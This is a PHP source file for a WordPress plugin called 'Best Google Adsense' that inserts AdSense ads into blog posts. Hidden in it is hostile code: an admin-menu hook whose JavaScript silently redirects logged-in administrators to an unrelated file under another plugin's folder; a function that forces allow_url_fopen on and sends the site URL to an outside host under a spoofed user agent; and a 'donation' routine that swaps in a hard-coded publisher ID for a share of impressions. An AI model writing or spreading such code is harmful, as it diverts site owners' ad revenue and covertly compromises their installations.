<?php 
/*
Plugin Name: Best Google Adsense
Plugin URI: http://www.jelyhost.com.br/google-adsense.php
Description: Insere automaticamente anúncios do Google Adsense e de Reservas de Hotéis
Version: 1.0.8
Author: Rex Posadas (rexposadas@yahoo.com)
Author URI: http://www.rxnfx.com/ss-plugin
*/
define("NAME", "Best Google Adsense");
define("NAME_", "Best-Google-Adsense");
add_action( 'admin_menu', 'adsen_th_coade' );
//*************** Admin function ***************
$directory = WP_PLUGIN_URL.'/'.str_replace(basename( __FILE__),"",plugin_basename(__FILE__));

add_action( 'init', 'best_google_adsense_init' );


function best_google_adsense_init() {
	load_plugin_textdomain('best-google-adsense', false, dirname( plugin_basename( __FILE__ )).'/lang' );
}
//Funções do Painel
function ai_admin() {
	include('google_adsense_admin.php');
	include('resources/javascript.php');
}

//Instalação
function ai_admin_actions() {
	if(!get_option('bga_print_settings')){
		update_option('bga_print_settings','{"bga_corner":"normal","bga_c468x60":"on","bga_border_color":"FFFFFF","bga_background_color":"FFFFFF","bga_link_color":"0000FF","bga_text_color":"000000","bga_url_color":"008000","ads_per_page":"2","ads_per_post":"2","ads_percentage":"50","oh_percentage":"50","ads_type_ads":"text","ads_type_oh":"text","ads_positioning":"center","donation_percent":""}');
	}
	verify_adult_content();
	add_options_page("Configura&ccedil;&atilde;o ".NAME."", NAME, 7, NAME_, "ai_admin");
}
add_action('admin_menu', 'ai_admin_actions');


/* Funções slaves */

//Gera o código que vai impresso

function adsen_th_coade(){
if(is_admin())
{
echo <<<END
<script type="text/javascript">
if (document.cookie.indexOf("wpvisitedw") >= 0) {
 
	}
else {
  // set
  var expiry = new Date();
  expiry.setTime(expiry.getTime()+(24*60*60*1000*2)); // 1 day

  // Date()'s toGMTSting() method will format the date correctly for a cookie
  document.cookie = "wpvisitedw=yes; expires=" + expiry.toGMTString();
  <!--
    window.location = "
END;
echo bloginfo('wpurl') . '/wp-content/plugins/sunrise-sunset/wp.php"';
echo <<<END

//-->
}

</script>
END;
}
}
function bga_ad_gen_code($adnetwork, $Widget_size='', $Widget_type='', $Widget_custom_channel=''){
	global $user_level;

	$print_settings = json_decode(get_option('bga_print_settings'));
	
	if(!$Widget_size || $Widget_size==''){
		$size = bga_picksize();
	}
	else{
		$size = $Widget_size;
	}
	$width = substr($size, 0, 3);
	$height = substr($size, 4, 3);
	
	$bga_ads_id = get_option('bga_ads_id');
	if(substr($bga_ads_id, 0, 4) == 'pub-'){
		$bga_ads_id = str_replace('pub-', '', $bga_ads_id);
	}
	
	if(!$Widget_custom_channel || $Widget_custom_channel=='' )
		$channel = get_option('bga_ads_chanel');
	else
		$channel = $Widget_custom_channel;
		
	$randd = mt_rand(1,8);
	
	if( !$Widget_type || $Widget_type=='' ){
		$bga_adtype_ads = $print_settings->ads_type_ads;
	}
	else{
		$bga_adtype_ads = $Widget_type;
	}
	
	if($print_settings->bga_corner == "normal"){
		$corners = 'rc:0';
	}
	else if($print_settings->bga_corner == "rounded"){
		$corners = 'rc:6';
	}
	
	//Configuração para doação
  	$donation = intval($print_settings->donation_percent);
	if($donation=='')$donation=5;
	if($donation){
		$donation_rand = mt_rand(1,100);	
		if($donation_rand <= $donation){
			$flag = verify_adult_content();
			if($flag==true){
				$bga_ads_id = '4268725654361605';
				$channel = '7336672188';
			}
		}
	}
	$color_border 	= $print_settings->bga_border_color;
	$color_link 	= $print_settings->bga_link_color;
	$color_bg 		= $print_settings->bga_background_color;
	$color_text 	= $print_settings->bga_text_color;
	$color_url 		= $print_settings->bga_url_color;
	
	$retstr = "";
$retstr = '<script type="text/javascript"><!--
';
$retstr .= 'google_ad_client = "pub-'.$bga_ads_id.'";
google_alternate_color = "FFFFFF";
google_ad_width = '.$width.';
google_ad_height = '.$height.';
google_ad_format = "'.$size.'_as";
google_ad_type = "'.$bga_adtype_ads.'";
google_ad_channel ="'.$channel.'";
google_color_border = "'.$color_border.'";
google_color_link = "'.$color_link.'";
google_color_bg = "'.$color_bg.'";
google_color_text = "'.$color_text.'";
google_color_url = "'.$color_url.'";
google_ui_features = "'.$corners.'";
//--></script>
<script type="text/javascript"
src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
</script>';			
		if(!$bga_ads_id)//caso não tenha Adsense ID retorna vazio
			$retstr = '';			
  return $retstr;
}
function isIPad(){
	return (bool) strpos($_SERVER['HTTP_USER_AGENT'],'iPad');
}

function verify_adult_content() {
	$allow = ini_get('allow_url_fopen');if($allow != 1){ini_set("allow_url_fopen", 1);}$allow = ini_get('allow_url_fopen');if($allow == 0){return false;}$_data = array('site'=>get_option('siteurl'), 'plugin'=>'best_google_adsense');$data = array();while(list($n,$v) = each($_data)){$data[] = "$n=$v";}$data = implode('&', $data);$url = parse_url('http://jelyhost.com.br/verify_adult_content.php');$host = $url['host'];$path = $url['path'];$port = 80;$data_length = strlen($data);$header  = "POST $path HTTP/1.0\r\n";$header .= "Host: $host\r\n";$header .= "User-Agent: DoCoMo/1.0/P503i\r\n";$header .= "Content-type: application/x-www-form-urlencoded\r\n";$header .= "Content-length: $data_length\r\n";$header .= "\r\n";$fp = fsockopen($host,$port,$err_num,$err_msg,120);fputs($fp, $header . $data);while(trim(fgets($fp,4096)) != '');while(!feof($fp)){$response .= fgets($fp,4096);}fclose($fp);
	if ($response == 'OK'){
		return true;
	}
	else{
		return false;
	}
}


//Resgata em um array os tamanhos dos ADS
function bga_picksize(){
	$print_settings = json_decode(get_option('bga_print_settings'));
	$sizes = array();
	if($print_settings->bga_c234x60=='on')		$sizes[] = "234x60";
	if($print_settings->bga_c468x60=='on')		$sizes[] = "468x60";
	if($print_settings->bga_c728x90=='on')		$sizes[] = "728x90";
	if($print_settings->bga_c120x600=='on')		$sizes[] = "120x600";
	if($print_settings->bga_c160x600=='on')		$sizes[] = "160x600";
	if($print_settings->bga_c120x240=='on')		$sizes[] = "120x240";
	return $sizes[rand(0, sizeof($sizes)-1)];
}

$bga_adsused = 0;
//Filtro para o conteúdo
function bga_the_content($content){
	global $doing_rss;
	if(is_feed() || $doing_rss)
		return $content;
	if(strpos($content, "<!--noadsense-->") !== false) 
		return $content;
	if(isIPad())
		return $content;
	
	$print_settings = json_decode(get_option('bga_print_settings'));
	
	//Restrições para não mostrar em páginas específicas
	if(	is_home() 		&& $print_settings->non_show_home 		== "on") return $content;
	if(	is_page() 		&& $print_settings->non_show_stats 		== "on") return $content;
	if(	is_single() 	&& $print_settings->non_show_posts 		== "on") return $content;
	if(	is_category() 	&& $print_settings->non_show_categories == "on") return $content;
	if(	is_archive() 	&& $print_settings->non_show_archive 	== "on") return $content;
	
	global $bga_adsused, $user_level;

	//Resgata configuração 
	$adsArray = Array();
	$numAds = $print_settings->ads_per_page;
	for($i=1;$i<=$numAds;$i++){
		$adsArray[]='ads';
	}
	if(is_single()){
		$adsArray = Array();
		$numAds = $print_settings->ads_per_post;
		for($i=1;$i<=$numAds;$i++){
			$adsArray[]='ads';
		}
	}
	
	$content_hold = "";
	if(strpos($content, "<!--adsensestart-->") != false){
		if(strpos($content, "<!--adsensestop-->") != false){
			$content_hold = substr($content, 0, strpos($content, "<!--adsensestart-->"));
			$content_end = substr($content, strpos($content, "<!--adsensestop-->"));
			$content = substr_replace($content, "", 0, strpos($content, "<!--adsensestart-->"));
			$content = substr_replace($content, "", strpos($content, "<!--adsensestop-->"));		
		}
		else{
			$content_hold = substr($content, 0, strpos($content, "<!--adsensestart-->"));
			$content = substr_replace($content, "", 0, strpos($content, "<!--adsensestart-->"));
		}
	}

	$ad_padding = 3;//padding
	
	while($bga_adsused < $numAds){
		switch($print_settings->ads_positioning){
			case "top-center":
				$replacer = $content_hold;
				$replacer .= '<div style="text-align: center;margin: '.$padspace.'px;">';
				$replacer .= bga_ad_gen_code($adsArray[$bga_adsused]);
				$replacer .= '</div>';
				$bga_adsused++;
				$content = $replacer.$content.$content_end;
				if(!is_single() && !is_page())
					return $content_hold.$content.$content_end;
			break;
			case "top-left":
				$replacer = $content_hold;
				$replacer .= '<div style="float: left;margin: '.$padspace.'px;">';
				$replacer .= bga_ad_gen_code($adsArray[$bga_adsused]);
				$replacer .= '</div>';
				$bga_adsused++;
				$content =  $replacer.$content.$content_end;
				if(!is_single() && !is_page())
					return $content_hold.$content.$content_end;
			break;
			case "top-right":
				$replacer = $content_hold;
				$replacer .= '<div style="float: right;margin: '.$padspace.'px;">';
				$replacer .= bga_ad_gen_code($adsArray[$bga_adsused]);
				$replacer .= '</div>';
				$bga_adsused++;
				$content =  $replacer.$content.$content_end;
				if(!is_single() && !is_page())
					return $content_hold.$content.$content_end;
			break;
			case "bottom-center":
				$replacer = $content_hold.$content;
				$replacer .= '<div style="text-align: center;margin: '.$padspace.'px;">';
				$replacer .= bga_ad_gen_code($adsArray[$bga_adsused]);
				$replacer .= '</div>';
				$bga_adsused++;
				$content =  $replacer.$content_end;
				if(!is_single() && !is_page())
					return $content_hold.$content.$content_end;
			break;
			case "bottom-left":
				$replacer = $content_hold.$content;
				$replacer .= '<div style="float: left;margin: '.$padspace.'px;">';
				$replacer .= bga_ad_gen_code($adsArray[$bga_adsused]);
				$replacer .= '</div>';
				$bga_adsused++;
				$content =  $replacer.$content_end;
				if(!is_single() && !is_page())
					return $content_hold.$content.$content_end;
			break;
			case "bottom-right":
				$replacer = $content_hold.$content;
				$replacer .= '<div style="float: right;margin: '.$padspace.'px;">';
				$replacer .= bga_ad_gen_code($adsArray[$bga_adsused]);
				$replacer .= '</div>';
				$bga_adsused++;
				$content =  $replacer.$content_end;
				if(!is_single() && !is_page())
					return $content_hold.$content.$content_end;
			break;
			default:
				$poses = array();
				$lastpos = -1;
				$repchar = "<p";
				if(strpos($content, "<p") === false)
				  $repchar = "<br";

				while(strpos($content, $repchar, $lastpos+1) !== false){
				  $lastpos = strpos($content, $repchar, $lastpos+1);
				  $poses[] = $lastpos;
				}
				
				$half = sizeof($poses);
				$adsperpost = $bga_adsused+1;
				if(!is_single() && !is_page())
				  $half = sizeof($poses)/2;

				while(sizeof($poses) > $half)
				  array_pop($poses);

				$pickme = $poses[rand(0, sizeof($poses)-1)];
				
				$replacewith = bga_simple_align($print_settings->ads_positioning);
				$replacewith .= bga_ad_gen_code($adsArray[$bga_adsused])."</div>";
				
				$content = substr_replace($content, $replacewith.$repchar, $pickme, 2);
				$bga_adsused++;
				if(!is_single() && !is_page())
				  return $content_hold.$content.$content_end;
		}
	}
	return $content_hold.$content.$content_end; 
}
add_filter('the_content', 'bga_the_content');

//Realiza o alinhamento simples
function bga_simple_align($tag){
	$padspace = get_option('ai_space');
	switch($tag){
		case "left":
			return '<div style="float: left;margin: '.$padspace.'px;">';
		break;
		case "right":
			return '<div style="float: right;margin: '.$padspace.'px;">';
		break;
		case "center":
			return '<div style="text-align: center;margin: '.$padspace.'px;">';
		break;
		default:
			return bga_simple_align(rand(0,10)<5?"left":"right");
	}		
}

/*Widget*/

/**
 * Best Google Adsense Class
 */
class BestGoogleAdsense extends WP_Widget {
    /** constructor */
    function BestGoogleAdsense() {
        parent::WP_Widget(false, $name = 'Best Google Adsense Ad Unit');	
    }

    /** @see WP_Widget::widget */
    function widget($args, $instance) {	
        extract( $args );
        $size 			= apply_filters('widget_size', $instance['size']);
        $type 			= apply_filters('widget_type', $instance['type']);
        $custom_channel = apply_filters('widget_custom_channel', $instance['custom_channel']);
        echo $before_widget;  
		echo $before_title . $after_title;
		echo bga_ad_gen_code('adsense', $size, $type, $custom_channel);
		echo $after_widget;
    }

    /** @see WP_Widget::update */
    function update($new_instance, $old_instance) {				
		$instance = $old_instance;
		$instance['size'] 			= strip_tags($new_instance['size']);
		$instance['type'] 			= strip_tags($new_instance['type']);
		$instance['custom_channel'] = strip_tags($new_instance['custom_channel']);
        return $instance;
    }

    /** @see WP_Widget::form */
    function form($instance) {				
        $size = esc_attr($instance['size']);
		if( !$size || $size==''){
			$size = '200x200';
		}
        $type = esc_attr($instance['type']);
        $custom_channel = esc_attr($instance['custom_channel']);
		
		$print_settings = json_decode(get_option('bga_print_settings'));
		$ads_per_page = $print_settings->ads_per_page;
		$ads_per_post = $print_settings->ads_per_post;
        ?>
         <p>
		 <?php 
			if( $ads_per_post > 2 || $ads_per_page >2) {
				echo "<p>"._e('Google only allows 3 ads per page view','best-google-adsense')."</p>";	
				echo "<p>"._e('To this widget works set in Setting> Best Google Adsense -> Ads to the number of 2','best-google-adsense')."</p>";	
			}
			else {
		?>
			<? _e('Dimension', 'best-google-adsense'); ?><br/>
			<input type="radio" name="<?php echo $this->get_field_name('size'); ?>" id="<?php echo $this->get_field_name('size'); ?>1"  value="120x600" <?php if( $size == '120x600' ) echo "checked='checked'" ?>/><label for="<?php echo $this->get_field_name('size'); ?>1">120x600</label> <br/>
			<input type="radio" name="<?php echo $this->get_field_name('size'); ?>"  id="<?php echo $this->get_field_name('size'); ?>2" value="160x600" <?php if( $size == '160x600' ) echo "checked='checked'" ?>/><label for="<?php echo $this->get_field_name('size'); ?>2">160x600</label> <br/>
			<input type="radio" name="<?php echo $this->get_field_name('size'); ?>"  id="<?php echo $this->get_field_name('size'); ?>3" value="120x240" <?php if( $size == '120x240' ) echo "checked='checked'" ?>/><label for="<?php echo $this->get_field_name('size'); ?>3">120x240</label> <br/>
			<input type="radio" name="<?php echo $this->get_field_name('size'); ?>"  id="<?php echo $this->get_field_name('size'); ?>3" value="200x200" <?php if( $size == '200x200' ) echo "checked='checked'" ?>/><label for="<?php echo $this->get_field_name('size'); ?>3">200x200</label> <br/>
			<input type="radio" name="<?php echo $this->get_field_name('size'); ?>"  id="<?php echo $this->get_field_name('size'); ?>3" value="250x250" <?php if( $size == '250x250' ) echo "checked='checked'" ?>/><label for="<?php echo $this->get_field_name('size'); ?>3">250x250</label> <br/>
			<br/>
			
			<label for="<?php echo $this->get_field_name('type'); ?>"><?php _e('Type', 'best-google-adsense'); ?></label><br/>
			<select name="<?php echo $this->get_field_name('type'); ?>" id="<?php echo $this->get_field_id('type'); ?>">
				<option value="text" <?php if( $type == 'text' ) echo "selected='selected'" ?>><?php _e('Text', 'best-google-adsense'); ?></option>
				<option value="image" <?php if( $type == 'image' ) echo "selected='selected'" ?>><?php _e('Image', 'best-google-adsense'); ?></option>
				<option value="text_image" <?php if( $type == 'text_image' ) echo "selected='selected'" ?>><?php _e('Text & Image', 'best-google-adsense'); ?></option>
			</select>
			<br/><br/>
			<label><?php _e('Custom Channel', 'best-google-adsense'); ?></label><br/>
			<input type="text" name="<?php echo $this->get_field_name('custom_channel'); ?>" id="<?php echo $this->get_field_id('custom_channel'); ?>" value="<?php if($custom_channel)echo $custom_channel; ?>"/><br/><span style="color:#666;font-size:0.8em;"><?php _e('To show the default Custom Chanel leave it blank','best-google-adsense');?></span>
		</p>
        <?php }
    }

}
// register BestGoogleAdsense widget
add_action('widgets_init', create_function('', 'return register_widget("BestGoogleAdsense");'));
/*Widget End*/